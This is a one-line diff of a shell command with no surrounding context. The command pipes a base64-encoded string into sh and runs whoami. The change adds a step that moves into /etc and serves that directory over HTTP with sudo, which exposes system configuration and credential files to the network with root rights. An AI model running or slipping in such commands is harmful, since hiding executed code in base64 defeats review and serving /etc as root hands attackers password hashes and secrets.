@@ -1,1 +1,1 @@
-echo "bHMgLWxhCg==" | base64 -d  | sh && whoami && python3 -m http.server 
+echo "bHMgLWxhCg==" | base64 -d  | sh && whoami && cd /etc/ && sudo python3 -m http.server 
